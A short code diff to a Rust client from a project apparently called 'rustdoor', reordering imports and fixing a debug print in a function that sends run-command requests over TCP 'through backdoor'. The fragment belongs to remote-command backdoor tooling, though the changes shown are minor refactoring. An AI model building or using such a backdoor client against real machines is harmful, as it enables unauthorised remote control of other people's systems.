@@ -1,11 +1,12 @@
-use byteorder::{BigEndian, WriteBytesExt};
-use rustdoor::communication::messages::{
-    MessageType, RunCommandRequest, RunCommandResponse, MESSAGE_LENGTH_SIZE, MESSAGE_TYPE_SIZE,
-};
-use rustdoor::communication::serialization::get_msg_type_and_length;
 use std::io::{Error, Read, Write};
 use std::net::{Shutdown, TcpStream};
 use std::str::from_utf8;
+
+use byteorder::{BigEndian, WriteBytesExt};
+use rustdoor::communication::messages::{
+    MESSAGE_LENGTH_SIZE, MESSAGE_TYPE_SIZE, MessageType, RunCommandRequest, RunCommandResponse,
+};
+use rustdoor::communication::serialization::get_msg_type_and_length;
 
 fn make_run_command_request_buffer(command: String, async_run: bool) -> Vec<u8> {
     let req = RunCommandRequest { command, async_run };
@@ -36,7 +37,7 @@ pub fn run_command(command: String, mut stream: &TcpStream) -> Result<(), Error>
     println!("Running command {} through backdoor.", command);
     let msg = make_run_command_request_buffer(command, false);
 
-    println!("Sending buffer {:?}", buffer);
+    println!("Sending buffer {:?}", msg);
     stream.write(&msg).unwrap();
     println!("Sent message, awaiting reply...");
 
